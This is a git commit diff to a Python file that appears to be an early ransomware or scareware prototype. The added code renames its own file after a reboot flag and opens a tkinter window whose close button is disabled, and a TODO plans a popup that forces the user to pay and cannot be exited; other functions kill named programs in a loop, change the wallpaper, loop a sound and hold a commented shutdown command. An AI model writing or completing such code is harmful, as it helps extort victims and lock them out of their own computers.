0b1a947a8d5e2a09ede1770cbd3c97fa4ffb9c9a
Michlinek1 <94484725+Michlinek1@users.noreply.github.com>
2023-02-22 18:50:51 +0100

    Update main.py

--- main.py
+++ main.py
@@ -1,3 +1,38 @@
+import os
+from pathlib import Path
+from tkinter import *
+PATH = str(Path(__file__).parent.resolve())
+def wasRebooted() -> bool:
+    try:
+        with open("file.txt", "r") as f:
+            was_rebooted = f.read().strip() == 'True'
+    except Exception:
+        was_rebooted = False
+
+    return was_rebooted
+wasRebooted()
+def startUp():
+    if wasRebooted() == True:
+        os.rename(str(Path(__file__).absolute()), "costam.py")
+        root = Tk()
+        root.geometry("500x500")
+        root.title("132")
+        def disable_event():
+            pass
+        root.protocol("WM_DELETE_WINDOW", disable_event)
+        root.mainloop()
+
+
+startUp()        
+
+                
+"""TODO: 
+   -Change the file's picture
+   -Create a popup using tkinter, which forces user to pay(User won't be able to exit this popup)
+   -If he does, the computer will restart
+
+
+"""
 def kill(listOfPrograms: str | list[str]):
     import psutil
     while True:
@@ -23,20 +58,25 @@ def kill(listOfPrograms: str | list[str]):
 
 def changeWallPaper():
     import ctypes
-    import os
-    from pathlib import Path
     if os.path.exists("wallpaper.jpg"):
-        ctypes.windll.user32.SystemParametersInfoW(20, 0, str(Path(__file__).parent.resolve()) + "\wallpaper.jpg" , 3)
+        ctypes.windll.user32.SystemParametersInfoW(20, 0,  PATH + "\wallpaper.jpg" , 3)
     else:
         print("wallpaper.jpg doesn't exist!")
 
-def playSound(music: str):
+def playSound():
     from time import sleep
     from playsound import playsound as play
     while True:
-        play(music)
+        play(PATH + "sound.mp3")
         sleep(1)
+
+def restart():
+    #os.system("Shutdown -s -t 1")
+    with open('file.txt', 'w') as f:
+        f.write('True')
+
 
 #kill(['brave.exe', 'spotify.exe'])
 #changeWallPaper()
 #playSound('sound.mp3')
+
